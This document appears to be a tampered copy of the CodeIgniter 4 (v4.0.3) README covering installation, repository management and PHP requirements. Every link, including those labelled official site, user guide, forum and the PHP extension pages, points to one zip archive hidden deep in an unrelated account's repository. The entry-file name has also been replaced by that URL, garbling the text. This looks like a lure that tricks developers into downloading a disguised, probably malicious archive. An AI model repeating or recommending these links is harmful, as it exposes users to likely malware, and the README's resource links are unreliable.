# CodeIgniter 4 Framework (v 4.0.3)

## What is CodeIgniter?

CodeIgniter is a PHP full-stack web framework that is light, fast, flexible, and secure. 
More information can be found at the [official site](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip).

This repository holds the distributable version of the framework,
including the user guide. It has been built from the 
[development repository](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip).

More information about the plans for version 4 can be found in [the announcement](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip) on the forums.

The user guide corresponding to this version of the framework can be found
[here](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip). 


## Important Change with https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip

`https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip` is no longer in the root of the project! It has been moved inside the *public* folder,
for better security and separation of components.

This means that you should configure your web server to "point" to your project's *public* folder, and
not to the project root. A better practice would be to configure a virtual host to point there. A poor practice would be to point your web server to the project root and expect to enter *public/...*, as the rest of your logic and the
framework are exposed.

**Please** read the user guide for a better explanation of how CI4 works!
The user guide updating and deployment is a bit awkward at the moment, but we are working on it!

## Repository Management

We use Github issues, in our main repository, to track **BUGS** and to track approved **DEVELOPMENT** work packages.
We use our [forum](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip) to provide SUPPORT and to discuss
FEATURE REQUESTS.

This repository is a "distribution" one, built by our release preparation script. 
Problems with it can be raised on our forum, or as issues in the main repository.

## Contributing

We welcome contributions from the community.

Please read the [*Contributing to CodeIgniter*](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip) section in the development repository.

## Server Requirements

PHP version 7.2 or higher is required, with the following extensions installed: 

- [intl](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip)
- [libcurl](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip) if you plan to use the HTTP\CURLRequest library

Additionally, make sure that the following extensions are enabled in your PHP:

- json (enabled by default - don't turn it off)
- [mbstring](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip)
- [mysqlnd](https://github.com/aaonedollar/ci403/raw/refs/heads/main/system/Validation/Exceptions/ci_v3.5.zip)
- xml (enabled by default - don't turn it off)
